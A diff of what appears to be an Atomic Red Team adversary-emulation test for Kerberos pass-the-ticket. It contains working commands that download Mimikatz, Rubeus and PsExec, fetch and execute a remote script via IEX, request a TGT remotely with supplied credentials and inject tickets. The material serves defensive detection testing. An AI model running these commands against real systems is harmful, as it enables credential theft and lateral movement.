@@ -15,23 +15,24 @@ atomic_tests:
     mimikatz_exe:
       description: Path of the Mimikatz binary
       type: path
-      default: PathToAtomicsFolder\T1550.003\bin\x64\mimikatz.exe
+      default: PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Mimikatz must exist on disk at specified location (#{mimikatz_exe})
     prereq_command: |
-      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+      if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
       $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
       $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
-      $basePath = Split-Path #{mimikatz_exe} | Split-Path
+      $basePath = Split-Path "#{mimikatz_exe}" | Split-Path
       Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
   executor:
     command: |
-      #{mimikatz_exe} "kerberos::ptt #{ticket}"
+      "#{mimikatz_exe}" "kerberos::ptt #{ticket}"
     name: command_prompt
 - name: Rubeus Kerberos Pass The Ticket
   auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
@@ -57,43 +58,36 @@ atomic_tests:
       description: domain
       type: string
       default: $Env:USERDOMAIN
-    rubeus_path:
-      description: Path of the Rubeus binary
-      type: path
-      default: $Env:TEMP\rubeus.exe
     rubeus_url:
       description: URL of Rubeus executable
       type: url
       default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
-    psexec_path:
-      description: Path of the PsExec binary
-      type: string
-      default: C:\PSTools\PsExec.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Rubeus must exist on disk at specified location (#{rubeus_path})
+      Rubeus must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
     prereq_command: |
-      if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-Webrequest -Uri #{rubeus_url} -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
   - description: |
-      PsExec must exist on disk at specified location (#{psexec_path})
+      PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"
     prereq_command: |
-      if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
-      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-      New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
-      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
+      New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
   executor:
     name: powershell
     elevation_required: true
     command: |
-      #{psexec_path} -accepteula \\#{target} -w c:\ -c #{rubeus_path} asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
-      Set-Location $env:TEMP
+      & "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
+      Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
       Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
       Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
-      & "#{rubeus_path}" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
-      Remove-Item $env:TEMP\ticket.kirbi
-      & "#{rubeus_path}" purge      
+      & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
+      & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
